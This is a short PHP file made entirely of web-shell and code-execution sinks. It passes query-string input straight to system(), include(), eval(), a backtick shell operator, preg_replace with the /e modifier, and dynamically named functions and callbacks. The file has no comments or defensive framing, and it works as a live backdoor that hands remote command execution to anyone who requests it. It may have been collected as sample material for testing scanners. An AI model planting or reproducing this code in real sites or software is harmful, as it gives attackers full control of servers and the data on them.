<?  
system($_GET['x']);
phpinfo();

$file = $_GET['file'];
include($file);

$string = $_GET['p']; 
print preg_replace('/^(.*)/e', 'strtoupper(\\1)', $string);

$dyn_func = $_GET['dyn_func'];
$argument = $_GET['argument'];
$dyn_func($argument);

$evil_callback = $_GET['callback'];
$some_array = array(0, 1, 2, 3);
$new_array = array_map($evil_callback, $some_array);
<?=@`$c`?>
if (isset($_REQUEST['e'])) {
eval(stripslashes($_REQUEST['e']));
}
?>
